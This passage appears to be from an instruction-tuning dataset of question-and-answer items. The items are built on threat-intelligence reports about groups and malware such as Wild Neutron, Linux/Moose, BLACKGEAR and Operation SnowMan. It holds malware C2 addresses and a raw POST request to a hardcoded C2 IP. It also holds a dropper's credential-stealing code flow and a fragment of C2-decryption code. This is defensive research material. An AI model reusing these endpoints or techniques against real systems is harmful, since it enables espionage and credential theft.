(\"uspeshno\" -> \"successfully\"); this string is written to a pipe after executing a C2 command.\nWe found another non-English string which is the latin transcription of the russian word #WildNeutron\nOne of the samples has an internal name of \"WinRAT-Win32-Release.exe\". This seems to indicate the authors are calling the malware \"WinRAT\".\nBig Headline: Conclusions\nCompared to other APT groups, Wild Neutron is one of the most unusual ones we've analysed and tracked. Active since 2011, the group has been using at least one zero-day exploit, custom malware and tools and managed to keep a relatively solid opsec which so far eluded most attribution efforts. Their targeting of major IT companies, spyware developers (FlexiSPY), jihadist forums (the \"Ansar Al-Mujahideen English Forum\") and Bitcoin companies indicate a flexible yet unusual mindset and interests.\nSome of group's distinctive features include:\nUse of open source tools and leaked sources of other malware\nUse of stolen certificate from Acer Incorporated to sign malware\nUse of cross platform zero-day exploit (Java and Flash) followed by cross platform payload reverse shell (Perl) for initial penetration\nUse of *NIX code ported to Windows through Cygwin\nHeavy use of SSH for exfiltration, a commonly used *NIX administration tool\nUse of CryptProtectData API to keep C&C URLs secret\nSimple command line interface, built around all malware components, utilizing named pipes for communication between modules;\nAuxiliary tools are written in C and most of them contain a built-in help, which may be printed by executing the binary with a \"\u2013pleh\" parameter\nWe continue to track the Wild Neutron group, which is still active as of June 2015.\nKaspersky products detect the malware used in the attacks as: HEUR:Trojan.Win32.WildNeutron.gen, Trojan.Win32.WildNeutron.*, Trojan.Win32.JripBot.*, HEUR:Trojan.Win32.Generic\nRead more about how Kaspersky Lab products can help to protect you from Wild Neutron threat actor here:\n\nWhat unique characteristics of the Wild Neutron group set them apart from other APT groups, and how did they maintain operational security while targeting a diverse range of entities?",
    "output": "A: The Wild Neutron group is distinguished by several unique characteristics that set them apart from other APT groups. They have been active since 2011 and have employed at least one zero-day exploit, custom malware, and tools while maintaining strong operational security. Their targets include major IT companies, spyware developers (FlexiSPY), jihadist forums (the 'Ansar Al-Mujahideen English Forum'), and Bitcoin companies, indicating a flexible and unusual mindset. Key features of their operations include the use of open-source tools and leaked sources of other malware, stolen certificates from Acer Incorporated to sign malware, cross-platform zero-day exploits (Java and Flash) followed by cross-platform payload reverse shells (Perl) for initial penetration, and heavy use of SSH for data exfiltration. Additionally, they utilized the CryptProtectData API to keep C&C URLs secret and employed a simple command line interface built around all malware components, utilizing named pipes for communication between modules. Auxiliary tools were written in C and included a built-in help feature accessible with a '\u2013pleh' parameter. These tactics allowed them to maintain a relatively solid operational security posture while targeting a diverse range of entities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: 6. CONCLUSION\nLinux/Moose is a novelty when you consider that most embedded threats these days are used to perform DDoS attacks. Considering the rudimentary techniques used by Moose in order to gain access to other devices, it is unfortunate that the security of embedded devices isn't taken more seriously by vendors. With the increasing connectivity and proliferation of Linux-based devices, something will need to be done in that area. We hope that this publication will help vendors better understand how the malicious actors are targeting their devices.\nAs knowledgeable IT people, most of us already check if patches are installed or if anti-virus software is updated and operating when we visit friends and relatives. With all the embedded threats out there, we will need to add a quick check of their router to that to-do list. Consider contributing to our  if you find anything.\nUnfortunately, this type of animal is far from extinct.\nSmall Headline: Detection (yara)\nIn order to identify if a file or a set of files is the Linux/Moose threat you can use the popular yara tool. Using the linux-moose.yarYara rule available from our  you can recursively crawl a directory for Linux/Moose with:\nIf the command yields no output then no files were identified to be Linux/Moose. Otherwise identified filenames are printed.\nFurther modifications made by the malware author to evade detection will impact the usefulness of this Yara rule over time.\nMedium Headline: APPENDIX C: CLEANING\nReboot the affected device then change its password as soon as possible. Keep in mind, however, that the compromised system was accessible via credentials that the operators knew, that they were aware of its IP address and they had means to access its interactive console. They might have had manual access, which means that further infection is possible, including  (the link is in German). A factory reset, firmware update or reinstall and password change is probably best.\nMedium Headline: APPENDIX D: PREVENTION\nChange default passwords on network equipment even if it is not reachable from the Internet. Disable Telnet login and use SSH where possible.\nMake sure that your router is not accessible from the Internet on ports 22 (SSH), 23 (Telnet), 80 (HTTP) and 443 (HTTPS). If you are unsure about how to perform this test, when you are at home, use the \"common ports\" scan from the . Make sure that the above mentioned ports receive a Stealth or Closed status.\nRunning the latest firmware available from your embedded device vendor is also recommended.\nMedium Headline: APPENDIX E: POTENTIALLY TARGETED VENDORS\nNote To obtain the latest version of this list check our\nWe have cross-referenced the list of  in order to spread with a list of vendors known to have these as default credentials and confirmed that some of their products have Telnet access enabled. Here is the list of potentially targeted vendors we've come up using this methodology:\nNetwork equipment vendors\n3Com, Alcatel-Lucent, Allied Telesis, Avaya, Belkin, Brocade, Buffalo, Celerity, Cisco,\nD-link, Enterasys, Hewlett-Packard, Huawei, Linksys, Mikrotik, Netgear, Meridian, Nortel, SpeedStream, Thomson, TP-Link, Zhone, ZyXEL\nAppliances vendors\nAPC, Brother, Konica/Minolta, Kyocera, Microplex, Ricoh, Toshiba, Xerox\nInternet of Things vendors\nHik Vision, Leviton\nKeep in mind that this is a list of potentially targeted vendors. Current Moose versions need some Unix-type shell access in order to infect a machine where it successfully logged in. On some devices this type of access is hidden behind another set of credentials or tech-support secret passwords. Moose doesn't target these environments. Since we don't have access to the hardware for testing we couldn't validate this aspect in the above lists.\nIf you have access to any of this hardware please :\n\u2022 Is Telnet enabled by default?\n\u2022 Can you login with the default credentials via Telnet?\n\u2022 What make and model do you have?\n\u2022 What happens if you type in sh and then Enter on the default prompt?\nIf the credentials can be used via Telnet to login, if Telnet is enabled by default and if a shell access can be obtained by typing sh in the device's prompt, then these are very good indicators that a device could be infected by Linux/Moose.\nThe last list below contains vendors that were correlated using the as previously mentioned but that we were not able to gather information about if they had Telnet access enabled or not.\nEricsson, F5 Networks, Fortinet, Siemens, LSI Corporation, Maxim Integrated, Accelerated Network, Quantum, Advantek, Airtel, AirTies, Radware, Ubee Interactive, AOC, Applied Innovations, Arescom, ARtem, Asante, Ascend, ATL, Atlantis, AVM, Avocent, Axis, Aztech, Bay Networks, Bintec, BMC, Broadlogic, Canyon, Cellit, Ciphertrust, CNet, Compaq, Comtrend, Conceptronic, Conexant, Corecess, CTC Union, Cyclades, Davox, Demarc, Digicom, Draytek, Dynalink, E-Con, Efficient, Everfocus, Flowpoint, Gericom, IBM, iDirect, Inchon, Infacta, Infoblox, INOVA, Interbase, Intermec, Intracom, JD Edwards, Kasda, KTI, Lantronix, Laxo, LG, Livingston, Marconi, McAfee, McData, Mentec, Micronet, Milan, Motorola, Mro software, Netopia, Netport, Netscreen, Netstar, Niksun, Nokia, NOMADIX, Olitec(trendchip), OpenConnect, Osicom, Overland, Ovislink, Pansonic, Phoenix, Pirelli, Planet, Ptcl, QLogic, Quintum Technologies, RM, RoamAbout, Sagem, Samsung, Server TechnologyPower, Sharp, Signamax, Siips, Silex Technology, Simple Smdr, Sitecom, Smartswitch, SMC, Sonic-X, Spectra Logic, SpeedXess, Sphairon, SSA, Stratacom, Swissvoice, Symbol, System/32, Tandem, Telewell, Telindus, Tellabs, Topsec, Troy, TVT System, U.S. Robotics, Unisys, VASCO, VxWorks, Wang, Weidm\u00fceller, Westell, X-Micro, xd, Xylan, Xyplex, Zebra, ZTE\nIf you know that a particular vendor make and model that could be affected please contact us and contact them.\n\nQuestion: What preventive measures can be implemented to mitigate the risk of Linux/Moose infections on network equipment, and why are these measures crucial for maintaining security?\n\nAnswer:",
    "output": "Preventive measures include changing default passwords on network equipment, disabling Telnet login and using SSH where possible, ensuring the router is not accessible from the Internet on specific ports (22, 23, 80, 443), and running the latest firmware available from the vendor. These measures are crucial for maintaining security because they reduce the attack surface and make it more difficult for malware like Linux/Moose to exploit vulnerabilities in network devices.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: Conclusion\nIn this blog, we have described an ongoing global attack against telecommunications providers that has been active since at least 2017. The threat actor managed to infiltrate into the deepest segments of the providers' network, including some isolated from the internet, as well as compromise critical assets. Our investigation showed that these attacks were targeted, and that the threat actor sought to steal communications data of specific individuals in various countries.\nThroughout this investigation, we have uncovered the infrastructure that facilitated the malicious operations taken by this threat actor. The data exfiltrated by this threat actor, in conjunction with the TTPs and tools used, allowed us to determine with a very high probability that the threat actor behind these malicious operations is backed by a nation\nstate, and is affiliated with China. Our contextualized interpretation of the data suggests that the threat actor is likely APT10, or at the very least, a threat actor that shares, or wishes to emulate its methods by using the same tools, techniques, and motives.\nIt's important to keep in mind that even though the attacks targeted specific individuals, any entity that possesses the power to take over the networks of telecommunications providers can potentially leverage its unlawful access and control of the network to shut down or disrupt an entire cellular network as part of a larger cyber warfare operation.\nDue to multiple and various limitations, we cannot disclose all the information we have gathered on the attack in this report. Our team will continue to monitor and track the threat actor's activity in order to identify more tools and compromised organizations.\nAsk the researchers questions about this attack during their live webinar.\nClosing Notes: This research, which is still ongoing, has been a huge effort for the entire Cybereason Nocturnus team. Special thanks goes to Niv Yona, Noa Pinkas, Josh Trombley, Jakes Jansen, and every single member of the Nocturnus team for the countless hours and effort that were put into this research. We will continue to monitor and update our blog with more information once available and as our investigation progresses.\n\nHow did the threat actor behind Operation SoftCell manage to infiltrate the deepest segments of the telecommunications providers' networks, and what critical assets were compromised? Why is this significant in the context of nation-state backed cyber operations?",
    "output": "The threat actor behind Operation SoftCell managed to infiltrate the deepest segments of the telecommunications providers' networks, including some isolated from the internet, by leveraging sophisticated tactics, techniques, and procedures (TTPs). Critical assets compromised included communication data of specific individuals in various countries. This is significant because it demonstrates the threat actor's ability to penetrate highly secure environments and target specific individuals, indicating a high level of sophistication and resources typically associated with nation-state backed operations. Such capabilities pose a serious risk, as the threat actor could potentially leverage its access to disrupt or shut down entire cellular networks as part of a larger cyber warfare operation.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: C&C configuration retrieval\nBackdoors used by BLACKGEAR share a common characteristic: they all retrieve encrypted C&C configuration information from blogs or microblogs. An attacker would register an account on these services and then create posts. The encrypted C&C information would be between two hardcoded tags, as seen below:\nThere are two reasons BLACKGEAR would use this technique. First, the beacon traffic of the backdoor would look like normal traffic to blogs. Secondly, the threat actor would be able to quickly change the C&C servers used if these were blocked. A defender would be unable to block this change in server from reaching any affected machines unless the legitimate site was blocked as well.\nBig Headline: Tools Used by BLACKGEAR\nThe malware tools used by BLACKGEAR can be categorized into three categories: binders, downloaders and backdoors. Binders are delivered by attack vectors (such as phishing and\nwatering hole attacks) onto a machine. These, in turn, drop decoys and downloaders. The latter connect to various sites under the control of the attacker and downloads backdoors. These use persistent methods to ensure that they remain present on the affected machines to give attackers access to the machine in question.\nBy separating the attack tools into three stages, threat actors are able to adapt quickly. If one component is detected and/or blocked, it can be replaced without disrupting the entire toolset.\nMedium Headline: TSPY_RAMNY\nTSPY_RAMNY is a downloader dropped by TROJ_BLAGFLDR malware. To remain persistent, it moves itself to the Windows temp folder and drops a *.lnk (Windows Shortcut) file in the startup folder that points to itself. It also sends information about the compromised host (such as network settings) back to the download site.\nThe download link is formatted in the following format:\n\u2022 http://{IP address}/{folder name}/{webpage name} (Example: http://{IP address}/multi/index.html)\nThis is done so that if someone looks solely at the URL, the download of the backdoor will appear to be an ordinary website.\nMedium Headline: TSPY_YMALRMINI\nTSPY_YMALRMINI is another downloader that is dropped by TROJ_BLAGFLDR malware, which also sends information about compromised hosts back to the download site. We were unable to determine which payloads were used by this downloader. However, our research indicates that some of these downloads are saved as drWaston.exe on the compromised host. This same file name is also used by some ELIRKS variants, indicating a possible connection. TSPY_YMALRMINI uses the same URL format as RAMNY.\nTSPY_YMALRMINI has the same download link pattern as TSPY_RAMNY. The family name for this malware is because some variants have the PDB string \"C:\\toolson-mini\\YmailerCreater \u2013 Debug\\Binder\\Binder\\YMailer.pdb\". In addition, these variants also create a log file named YmailerMini.log.\nMedium Headline: BKDR_ELIRKS\nBKDR_ELIRKS was the first family of backdoors tied to BLACKGEAR. It retrieves encrypted C&C configuration information from various blogging or microblogging services. Once decoded, it connects to these C&C servers and waits for commands given by a threat actor. To remain persistent, it moves itself to the Windows temp folder and drops a *.lnk (Windows Shortcut) file in the startup folder that points to itself.\nIts backdoor routines include getting information from the compromised host, downloading and running files, taking screenshots, and opening a remote shell.\nMedium Headline: BKDR_ELIRKS\nReverse analysis of ELIRKS allowed us to determine how to decrypt the C&C information, which is done in the following Python code:\n#! /usr/bin/env python\nfrom ctypes import *\ndef decipher(v, k):\ny=c_uint32(v[0])\nz=c_uint32(v[1])\nsum=c_uint32(0xC6EF3720)\ndelta=c_uint32(0x61C88647)\nn=32\nw=[0,0]\nwhile(n>0):\nw[0]=y.value\nw[1]=z.value\nreturn w\nThe malware contains shellcode with two things: the URL of the blog entry and the tags that identify where in the fake articles the hidden C&C information is located. Once the fake blog/microblog posts are downloaded, the malware finds and decrypts the C&C information.\nThe C&C information is stored in the post in two short bits of text. The first is an eight-character string that is decoded into a six-byte hexadecimal value. The second is a two-character string which is already in a hexadecimal format, and is concatenated towards the end. A modified version of the (<https://web.archive.org/web/20070127094759/http:/www-users.cs.york.ac.uk/~matthew/TEA/>)TEA algorithm decrypts these into the C&C server locations.\nMedium Headline: BKDR_YMALR\nBKDR_YMALR implements the same behavior in a slightly different manner. It contains several encrypted strings:\nThese encrypted strings are the result of the blog URLs and tags being first encoded with Base64, and then encrypted with DES. The encryption key and initialization vector are hardcoded, with both set to 1q2w3e4r. (Note how these are positioned on a normal keyboard.)\nOnce these have been decoded, BKDR_YMALR uses the same algorithm as ELIRKS to obtain the C&C information.\nBig Headline: Connections between tools\nMore than just tools being used together, it appears that there are distinct connections between the different tools used by BLACKGEAR. The string \"YMailer\" shows up in the filenames of log files used by both BKDR_YMALR and TSPY_YMALRMINI, and it is in the PDB strings of the latter. The two downloaders TSPY_RLMNY and TSPY_YMALRMINI both use the\nstring toolson in different places. Lastly, both downloaders and one backdoor share the same decryption key 1q2w3e4r. The above illustration shows the connections between the families.\nMedium Headline: BKDR_ELIRKS\n\u2022 17cacabcf78c4b164bb0e7d9200289be9236e7bc\n\u2022 4157ecd252dc09b533fcf6a778aca2c376601354\n\u2022 4f54cfcf266b73ca3759b9cb0252c27094b5b330\n\u2022 521a9d73191c7740f969ae3c53e6abf70ffbedf9\n\u2022 533565f7953fb1648d437d14d007003c6343b9ae\n\u2022 80108d2aacb0a1f2a5350f71e7a04239fc5f96a9\n\u2022 8cad1bcbdd558802b34119fb57160cc748170133\n\u2022 9a768fae41ca7395b4257e85acef915e124c2981\n\u2022 a70001c67e81d1dcf62f808760514b6df28a411a\n\u2022 a9ea07caafeb63133e5131f7a56bc8da1bc3d72a\n\u2022 dd0ceafbe7f4bf2905e560c3348545e32bc0f684\nBKDR_YMALR\n\u2022 02fed8cae7f3986c1344dd75d869ba23cfc4073a\n\u2022 09d73b522f36786bb6e645b96f244bb51c3cc7ea\n\u2022 0a59d52367435bc22a92c27d60023acec575a5fb\n\u2022 0cc74332b1e213456693159d3ba12a3421036f68\n\u2022 1120f049dcb4a62809687dc277b42589d8d1caa6\n\u2022 12c8cc7e125572d614b708c056f7fd0ed49870c5\n\u2022 29b08d270ba6efcf57ca2ad33d8e3edd93d6b32a\n\u2022 2d3d7b9521aec637f2e99624e0489b9f140d463f\n\u2022 2de7d78615ec0fbf2652790d53b50ddb0472292c\n\u2022 31de946255b240c0ae2f56786ac25183f3aaeea5\n\u2022 3aa8509715c7f55bdee831d5f7db22a2c516db43\n\u2022 3d175b1defe7076e0fe56076dd0d5f438de43324\n\u2022 4000244b2cba78a45034bb6ab2bac46d6a8a79ea\n\u2022 4882735e8a465fac938fd04546a51efefb9806da\n\u2022 48d373bdb31dcecd7f59bd5a964d062c8b6bfce8\n\u2022 49f6eb7f8e4a27f574c9a3e8c0da0b7895df7e41\n\u2022 4c7df09012fc88d336467691acf0afce64f40341\n\u2022 551f9a60203bec904487113e8d42dea463ac6ca9\n\u2022 5a4b15fa5a615a93191ede4c75dd3e65e87586dc\n\u2022 5aa5117db6f420c81d2e1a7f036963a3c6ef02e9\n\u2022 5dc007d056513cba030ec16e15bdbb9ea5fe0e5a\n\u2022 628309a60ad1fbe240486519de1424f7ddc2df4d\n\u2022 636e7a9effb1a244697c880832e486de56260527\n\u2022 6bb5f51d03edd1acd7d38cca8095a237543c6a0d\n\u2022 6c4786b792f13643d408199e1b5d43f6473f5eea\n\u2022 6dd997409afec6fafbe54bd9d70d45fffff6a807\n\u2022 7142ca7079da17fa9871cbc86f7633b3253aeaed\n\u2022 7254b719fd3cf87c8ac8ed9327c8e1bf99abf7af\n\u2022 7329a789363f890c401c286dbaf3d2bf79ee14f7\n\u2022 7b2c4d14710cf2fd53486399ecc5af85cd75eca6\n\u2022 88e22933b76273793e4278c433562fb0b4fe125a\n\u2022 8917c582ab5c2e831de6eba33b4f19d6e3a2cb70\n\u2022 8c325e92bf21d0c3737dbbc596854bc12184eeaf\n\u2022 8f65cbde2f3b664bcede3822a19765bdb7f58099\n\u2022 9047b6b2e8fbaa8a06b2faaa30e038058444106a\n\u2022 93c3f23905599df78cd5416dd9f7c171b3f1e29e\n\u2022 94750bdae0fa190116a68e96d45f3d46c24b6cf1\n\u2022 9954a1c8e7b0e2f17841608f6b8c9d042b7a0780\n\u2022 9b96646d152583ff58c2c29191cb1672847d56b6\n\u2022 9f5a3b6db752d617f4d278d6531e2bbdb7faa977\n\u2022 a30cc98ceb5d3379e80443f68a186326926f73ce\n\u2022 a893896af5468ac6e04cdd13edff8cae04800848\n\u2022 a8f461749c7fe2a21116b8390cf84a8300009321\n\u2022 a9108bf3ce39cea40e46ac575247a9a7c077b2a8\n\u2022 a9fd9ade807af4779f3eea39fed2c583a50c8497\n\u2022 ac014e4c2d68f6c982ac58738857b698b9e46af5\n\u2022 acaec2b0f86ec4262be5bb8bcebcc12093e071ba\n\u2022 ad61c51b03022ef6bcb5e9738fe2f621e970ecb3\n\u2022 b28f6ba3d6571c5d85cb5276cbcdce9adf49d5a9\n\u2022 bc61f1b3c8eb3bda2071f6caf71ff23705128ca5\n\u2022 c30b305a7bea9a2f61aca2dbcf596c2b0c0e4fa0\n\u2022 c4c747f26f95fdbfc5bff04688dc76ae0bb48fff\n\u2022 c58d6fc761dec675ab45ad5c3682ffc9936cf357\n\u2022 c85f528900aa9d836abd88eb56902efd711491da\n\u2022 ca163d6ae85edede87b271267918a0ffe98040c7\n\u2022 cf629249fb4af86746059e638ccef5b8a43c6834\n\u2022 cfd9a67b4b0eb3d756bb7e449b46687e6aef006b\n\u2022 d107268bd767a2dfe1c8733b7da96c1a64f5d112\n\u2022 d7cd079f8485ea55443ed497f055dbed5ae4a668\n\u2022 d95c97f1525e9888571f498f2be584dda243da2a\n\u2022 e01f9ba6355bcdc7ccf89261658bff9f965b8c21\n\u2022 e05efde2b442dc4119179e3c39c74a973499e271\n\u2022 e1acfed710f186d86a2bc8179ff38fdd21f9a1b6\n\u2022 e1fb2e1866f332a5656bf55fde13ff57d5f0bbf6\n\u2022 e77303d80968395eec008515ea9eb3c620b14255\n\u2022 eb9e553524d414d862857297baf44da3b4072650\n\u2022 eca06f3c535ba3b3463917974a79efc821fddb6c\n\u2022 eeb065a1963a8aa0496e61305c076c5946d77e12\n\u2022 efa611262e6d4804ce9026d50bfa64f20d9271ca\n\u2022 fb59481d153388d2ad3bb6321d0b2875cb07f4d3\n\u2022 fbcbbc187e99317c5a36a3667592590a7f5a17d1\n\nQ: How does BLACKGEAR leverage blogs and microblogs to conceal its C&C configuration information? Why is this method effective against traditional detection mechanisms?",
    "output": "A: BLACKGEAR uses blogs and microblogs to store encrypted C&C configuration information between two hardcoded tags. This technique is effective for two main reasons. First, the beacon traffic of the backdoor looks like normal traffic to blogs, making it harder to detect. Secondly, the threat actor can quickly change the C&C servers if they are blocked, by simply updating the information in the blog posts. This makes it difficult for defenders to block the new C&C server information from reaching affected machines unless they block the legitimate site entirely.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: ASLR bypass\nBecause the vulnerability allows attackers to modify memory to an arbitrary address, the attacker can use it to bypass ASLR. For example, the attacker corrupts a Flash Vector object and then accesses the corrupted object from within Flash to access memory. We have discussed this technique and other ASLR bypass approaches (<http://www.fireeye.com/blog/technical/cyber-exploits/2013/10/aslr-bypass-apocalypse-in-lately-zero-day-exploits.html>)in our blog. One minor difference between the previous approaches and this attack is the heap spray address, which was changed to 0x1a1b2000 in this exploit.\nBig Headline: Shellcode analysis\nSubsequently, the malicious Flash code downloads a file containing the dropped malware payload. The beginning of the file is a JPG image; the end of the file (offset 36321) is the payload, encoded with an XOR key of 0\u00d795. The attacker appends the payload to the shellcode before pivoting to code control. Then, when the shellcode is executed, the malware creates files \"sqlrenew.txt\" and \"stream.exe\". The tail of the image file is decoded, and written to these files. \"sqlrenew.txt\" is then executed with the LoadLibraryA Windows API call.\nBig Headline: ZxShell payload analysis\nAs documented above, this exploit dropped an XOR (0\u00d795) payload that executed a ZxShell backdoor (MD5: 8455bbb9a210ce603a1b646b0d951bce). The compile date of the payload was 2014-02-11, and the last modified date of the exploit code was also 2014-02-11. This suggests that this instantiation of the exploit was very recent and was deployed for this specific strategic Web compromise of the Veterans of Foreign Wars website. A possible objective in the SnowMan attack is targeting military service members to steal military intelligence. In addition to retirees, active military personnel use the VFW website. It is probably no coincidence that Monday, Feb. 17, is a U.S. holiday, and much of the U.S. Capitol shut down\nThursday amid a severe winter storm.\nThe ZxShell backdoor is a widely used and publicly available tool used by multiple threat actors linked to cyber espionage operations. This particular variant called back to a command and control server located at newss[.]effers[.]com. This domain currently resolves to 118.99.60.142. The domain info[.]flnet[.]org also resolved to this IP address on 2014-02-12.\nBig Headline: Infrastructure analysis\nThe info[.]flnet[.]org domain overlaps with icybin[.]flnet[.]org and book[.]flnet[.]org via the previous resolutions to the following IP addresses:\n58.64.200.178\n58.64.200.179\n103.20.192.4\nWe previously observed Gh0stRat samples with the custom packet flag \"HTTPS\" calling back to book[.]flnet[.]org and icybin[.]flnet[.]org. The threat actor responsible for (<http://www.fireeye.com/blog/technical/cyber-exploits/2013/09/operation-deputydog-zero-day-cve-2013-3893-attack-against-japanese-targets.html>)Operation DeputyDog also used the \"HTTPS\" version of the (<http://www.emc.com/collateral/hardware/solution-overview/h11146-the-voho-campaign-so.pdf>)Gh0st. We also observed another \"HTTPS\" Gh0st variant connecting to a related command and control server at me[.]scieron[.]com.\nThe me[.]scieron[.]com domain previously resolved to 58.64.199.22. The book[.]flnet[.]org domain also resolved to another IP in the same subnet 58.64.199.0/24. Specifically, book[.]flnet[.]org previously resolved to 58.64.199.27.\nOthers domain seen resolving to this same /24 subnet were dll[.]freshdns[.]org, ali[.]blankchair[.]com, and cht[.]blankchair[.]com. The domain dll[.]freshdns[.]org resolved to 58.64.199.25. Both ali[.]blankchair[.]com and cht[.]blankchair[.]com resolved to 58.64.199.22.\nA number of other related domains resolve to these IPs and other IPs also in this /24 subnet. For the purposes of this blog, we've chosen to focus on those domains and IP that relate to the previously discussed DeputyDog and Ephemeral Hydra campaigns.\nYou may recall that dll[.]freshdns[.]org, ali[.]blankchair[.]com and cht[.]blankchair[.]com were all linked to both (<http://www.fireeye.com/blog/technical/cyber-exploits/2013/09/operation-deputydog-zero-day-cve-2013-3893-attack-against-japanese-targets.html>)Operation DeputyDog and (<http://www.fireeye.com/blog/technical/cyber-exploits/2013/11/operation-ephemeral-hydra-ie-zero-day-linked-to-deputydog-uses-diskless-method.html>)Operation Ephemeral Hydra. Figure 1 illustrates the infrastructure overlaps and connections we observed between the strategic Web compromise campaign leveraging the VFW's website, the DeputyDog, and the Ephemeral Hydra operations.\nBig Headline: Links to DeputyDog and Ephemeral Hydra\nOther tradecraft similarities between the actor(s) responsible for this campaign and the actor(s) responsible for the DeputyDog/Ephemeral Hydra campaigns include:\nThe use of zero-day exploits to deliver a remote access Trojan (RAT)\nThe use of strategic web compromise as a vector to distribute remote access Trojans\nThe use of a simple single-byte XOR encoded (0\u00d795) payload obfuscated with a .jpg extension\nThe use of Gh0stRat with the \"HTTPS\" packet flag\nThe use of related command-and-control (CnC) infrastructure during the similar time frames\nThey build ROP chains and shellcode the same way, both choose to corrupt a Flash Vector object, have some identical functions with common typos, and even share the same name.\nBig Headline: Conclusion\nThese actors have previously targeted a number of different industries, including:\nU.S. government entities\nJapanese firms\nDefense industrial base (DIB) companies\nLaw firms\nInformation technology (IT) companies\nMining companies\nNon-governmental organizations (NGOs)\nThe proven ability to successfully deploy a number of different private and public RATs using zero-day exploits against high-profile targets likely indicates that this actor(s) will continue to operate in the mid to long-term.\nThis entry was posted in (<http://www.fireeye.com/blog/category/technical/malware-research>)Advanced Malware, (<http://www.fireeye.com/blog/category/technical/cyber-exploits>)Exploits, (<http://www.fireeye.com/blog/category/technical/targeted-attack>)Targeted Attack, (<http://www.fireeye.com/blog/category/technical>)Threat Research, (<http://www.fireeye.com/blog/category/technical/vulnerabilities>)Vulnerabilities and tagged (<http://www.fireeye.com/blog/tag/0day>)0day, (<http://www.fireeye.com/blog/tag/zero-day>)zero-day by (<http://www.fireeye.com/blog/author/darien-kindlund>)Darien Kindlund, (<http://www.fireeye.com/blog/author/dan-caselden>)Dan Caselden, (<http://www.fireeye.com/blog/author/xiaobo-chen>)Xiaobo Chen, (<http://www.fireeye.com/blog/author/ned-moran>)Ned Moran and (<http://www.fireeye.com/blog/author/mscott>)Mike Scott. Bookmark the (<http://www.fireeye.com/blog/technical/cyber-exploits/2014/02/operation-snowman-deputydog-actor-compromises-us-veterans-of-foreign-wars-website.html>)permalink.\n\nQ: How does the infrastructure analysis in the Operation SnowMan attack reveal links to previous campaigns like DeputyDog and Ephemeral Hydra, and what are the key indicators of these connections?",
    "output": "A: The infrastructure analysis in the Operation SnowMan attack reveals links to previous campaigns through overlapping domains and IP addresses. For instance, the domain info[.]flnet[.]org overlaps with icybin[.]flnet[.]org and book[.]flnet[.]org via previous resolutions to specific IP addresses. These domains were also associated with Gh0stRat samples using the 'HTTPS' packet flag, which was a characteristic of the DeputyDog campaign. Additionally, the domain me[.]scieron[.]com resolved to an IP in the same subnet as book[.]flnet[.]org, further linking it to DeputyDog and Ephemeral Hydra. Other domains like dll[.]freshdns[.]org, ali[.]blankchair[.]com, and cht[.]blankchair[.]com also resolved to IPs in this subnet, indicating a broader network of related infrastructure. These connections suggest that the actors behind Operation SnowMan are likely the same or affiliated with those responsible for DeputyDog and Ephemeral Hydra.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does Group 72, a sophisticated threat actor group, utilize spearphishing links as part of their tactics, techniques, and procedures to target high-profile organizations?",
    "output": "Phishing: Spearphishing Link is a technique used by adversaries to send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Group 72, a sophisticated threat actor group, is known to use spearphishing as one of their preferred tactics to target high-profile organizations with high-value intellectual property in the manufacturing, industrial, aerospace, defense, and media sectors. The group's use of spearphishing links allows them to download malware onto the victim's system, potentially compromising the web browser or prompting the user to download malicious applications or documents. Group 72's operational security is very good, but patterns in their domains and email addresses can be identified, such as naming domains after their intended victim, which can be used to track their activities. Furthermore, the group's use of spearphishing links may also involve social engineering techniques, such as posing as a trusted source, to trick the user into clicking on the malicious link. By utilizing spearphishing links, Group 72 can gain access to sensitive information and intellectual property, allowing them to conduct further attacks against the organization.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: Why does the presence of a Remote Access Tool (RAT) like Poison Ivy (PIVY) often indicate a targeted attack known as an Advanced Persistent Threat (APT)?",
    "output": "The presence of a RAT like Poison Ivy often indicates an APT because, unlike malware focused on opportunistic cybercrime, RATs require a live person on the other side of the attack. This characteristic suggests that the attacker is specifically interested in the targeted organization and is actively involved in the attack, making it more personal and potentially more dangerous.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Code flow:\n\u2022 Check OS version, install date, username and system metrics\n\u2022 Check for event \"51032_861222508099\"\n\u2022 Copy self to %APPDATA%\\<mal_folder_name>\\<mal_filename>.exe, where <mal_folder_name> and <file_name> are chosen from the list of strings hardcoded in the binary\n\u2022 Set attribs of the copied dropper to hidden & system\n\u2022 Move the original dropper to <dropper_path>err.log<rand_nr>\n\u2022 Set file attributes to hidden & temporary\n\u2022 Use MoveFileWithProgress to delete the original dropper on the next reboot\n\u2022 Copy %SYSTEM%chkdsk.exe file to the path and filename of the original dropper\n\u2022 Copy %SYSTEM%chkdsk.exe to \"%APPDATA%\\<mal_folder_name>\\<mal_filename> .exe \" (with the space at the end)\n\u2022 Create folder %APPDATA%\\<mal_folder_name>\\plugs\n\u2022 Use COM objects (IShellLink &IPersistFile interfaces) to create a link in the Startup folder\n\u2022 Extract the credentials from Internet Explorer's password manager and save them to <mal_ folder_name>\\prx.jpg file; keep monitoring the credentials in loop and updating the file\n\u2022 Check if any browser process is running and if so, inject the DLL spying on the basic authentication credentials sent via HTTP traffic; affected browsers include Internet Explorer, Firefox, Mozilla and Opera\n\u2022 Check Internet connection by sending GET request to adobe.com/geo/productid.php and microsoft.com/en-us/default.aspx\n\u2022 If Internet is working, initiate the communication with C2  (the IP address is hardcoded in the binary) by sending the following post request\nPOST 93.188.161.235/check_value.php?identifiant=51032_861222508099&version=ver4_2\n\u2022 Await commands\n\u2022 If the C2 is not available, create an empty file: <mal_folder_name>\\inact.api\n\u2022 Create C:\\ProgramData\\Mail\\MailAg\\gl directory\n\u2022 Create a thread that monitors this directory and sends the content of files found inside it to the C2 server; the data is encrypted with a combination of XOR and other bitwise operations before sending\nMedium Headline: Screenshot module\nThis EXE copies the additional MZ from its overlay to C:\\ProgramData\\Cap\\Cap.exe and runs this file using following command:\n\"C:\\cmd.exe /c C:\\ProgramData\\Cap\\Cap.exe /d 